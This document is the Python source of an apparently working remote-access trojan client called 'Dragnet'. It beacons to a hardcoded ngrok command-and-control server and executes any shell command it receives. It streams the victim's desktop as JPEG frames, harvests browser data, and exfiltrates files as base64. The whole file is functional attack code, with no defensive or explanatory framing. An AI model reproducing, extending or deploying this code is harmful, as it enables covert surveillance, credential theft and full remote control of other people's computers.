
import subprocess, time, base64, os, threading, queue, requests
from io import BytesIO
from comms_channels import BaseChannel, HttpChannel, DnsChannel
from harvester import run_harvester
from mss import mss
from PIL import Image
from logo import DRAGNET_LOGO
from datetime import datetime
from textual.app import App, ComposeResult
from textual.widgets import Header, Footer, Static, Log
from textual.containers import Container
from textual.timer import Timer
from textual.reactive import reactive


SERVER_URL = "https://lithic-overbearingly-isela.ngrok-free.dev"
BEACON_INTERVAL = 5
CHANNEL_TO_USE = "http"
log_queue = queue.Queue()
status_queue = queue.Queue()
PERSISTENT_THREADS = {} 
STOP_EVENT = threading.Event()


def desktop_stream_thread():
    """Captures the screen, compresses it, and sends it to the server."""
    url = f"{SERVER_URL}/submit/frame"
    log_queue.put(("[INFO]", "Desktop streaming thread started."))
    
    with mss() as sct:
        while not STOP_EVENT.is_set():
            try:
                sct_img = sct.grab(sct.monitors[1])
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                
                buffer = BytesIO()
                img.save(buffer, format="JPEG", quality=70)
                jpeg_data = buffer.getvalue()

                requests.post(url, data=jpeg_data, headers={'Content-Type': 'application/octet-stream'}, timeout=1)
                time.sleep(0.1) # 10 FPS
            except Exception as e:
                log_queue.put(("[ERROR]", f"Streaming error: {e}"))
                time.sleep(2)

    log_queue.put(("[INFO]", "Desktop streaming thread stopped."))



def run_command(command: str, channel: BaseChannel) -> str:
    global PERSISTENT_THREADS
    cmd_parts = command.strip().split()
    cmd = cmd_parts[0]

    if cmd == "stream-desktop":
        if len(cmd_parts) > 1 and cmd_parts[1] == "start":
            if "desktop_stream" in PERSISTENT_THREADS: return "Error: Stream already running."
            STOP_EVENT.clear(); thread = threading.Thread(target=desktop_stream_thread, daemon=True)
            PERSISTENT_THREADS["desktop_stream"] = thread; thread.start()
            return "Desktop streaming initiated."
        elif len(cmd_parts) > 1 and cmd_parts[1] == "stop":
            if "desktop_stream" not in PERSISTENT_THREADS: return "Error: Stream not running."
            STOP_EVENT.set(); del PERSISTENT_THREADS["desktop_stream"]
            return "Desktop streaming stopped."
        else: return "Usage: stream-desktop <start|stop>"
            
    if cmd == "harvest-browsers":
        log_queue.put(("[TASK]", "Starting browser data harvester...")); harvested_data = run_harvester()
        log_queue.put(("[RESULT]", "Harvest complete. Packaging...")); return f"FILE_DOWNLOAD:{base64.b64encode(harvested_data.encode('utf-8')).decode('utf-8')}"
    if cmd == "say":
        msg = command.strip().split(" ", 1)[1]; channel.submit_chat(msg); return "Chat message relayed."
    if cmd == "download":
        parts = command.strip().split(" ", 1); return handle_download(parts[1]) if len(parts) == 2 else "Error: ..."
    
    try: return subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True, text=True)
    except Exception as e: return f"Shell error: {e}"

def handle_download(file_path):
    if not os.path.exists(file_path): return "Error: File not found."
    try:
        with open(file_path, 'rb') as f: content = f.read()
        return f"FILE_DOWNLOAD:{base64.b64encode(content).decode('utf-8')}"
    except Exception as e: return f"Error reading file: {e}"

def beaconing_thread(channel: BaseChannel):
    while True:
        try:
            status_queue.put("[cyan]BEACONING[/cyan]"); log_queue.put(("[STATUS]", "Beaconing to server..."))
            task = channel.get_task()
            if task and task != "none":
                status_queue.put("[yellow]EXECUTING[/yellow]"); log_queue.put(("[TASK]", f"Received: {task}"))
                result = run_command(task, channel)
                status_queue.put("[green]SENDING[/green]"); log_queue.put(("[RESULT]", f"Sending: {result[:100]}")) # Truncate long results
                channel.submit_result(result)
        except Exception as e: status_queue.put("[bold red]ERROR[/bold red]"); log_queue.put(("[ERROR]", f"Beaconing error: {e}"))
        finally: status_queue.put("[blue]IDLE[/blue]"); time.sleep(BEACON_INTERVAL)


class StatusDisplay(Static):
    status = reactive("[blue]INITIALIZING[/blue]"); heartbeat_char = reactive("●")
    def on_mount(self) -> None: self.heartbeat_timer = self.set_interval(0.5, self.update_heartbeat)
    def update_heartbeat(self) -> None: chars = ["●", "○"]; self.heartbeat_char = chars[(chars.index(self.heartbeat_char) + 1) % len(chars)]
    def render(self) -> str: return f"  STATUS: {self.status.ljust(15)} [bold green]{self.heartbeat_char}[/]"
class ClientApp(App):
    CSS = "StatusDisplay { border-top: round white; }"; BINDINGS = [("q", "quit", "Quit")]
    def compose(self) -> ComposeResult:
        yield Header(); yield Container(Static(DRAGNET_LOGO, id="logo-display"), StatusDisplay(), Log(id="log-view", highlight=True)); yield Footer()
    def on_mount(self) -> None:
        log_queue.put(("[INIT]", f"Channel mode set to [bold]{CHANNEL_TO_USE.upper()}[/]"))
        if CHANNEL_TO_USE.lower() == "http": channel = HttpChannel(SERVER_URL)
        elif CHANNEL_TO_USE.lower() == "dns": channel = DnsChannel(SERVER_URL)
        else: self.query_one(Log).write("[bold red]FATAL: Unknown channel in config.[/]"); return
        self.background_thread = threading.Thread(target=beaconing_thread, args=(channel,), daemon=True)
        self.background_thread.start(); log_queue.put(("[INIT]", "[green]Client is active and running in background.[/green]"))
        self.update_log_timer = self.set_interval(0.1, self.update_logs_and_status)
    def update_logs_and_status(self) -> None:
        while not log_queue.empty():
            tag, message = log_queue.get(); timestamp = datetime.now().strftime('%H:%M:%S')
            color_map = {"[STATUS]": "cyan", "[TASK]": "yellow", "[RESULT]": "green", "[INIT]": "blue", "[ERROR]": "red"}
            color = color_map.get(tag, "white")
            self.query_one(Log).write(f"[[dim]{timestamp}[/dim]] [bold {color}]{tag}[/bold {color}] {message}")
        if not status_queue.empty(): self.query_one(StatusDisplay).status = status_queue.get()
if __name__ == '__main__':
    app = ClientApp(); app.run()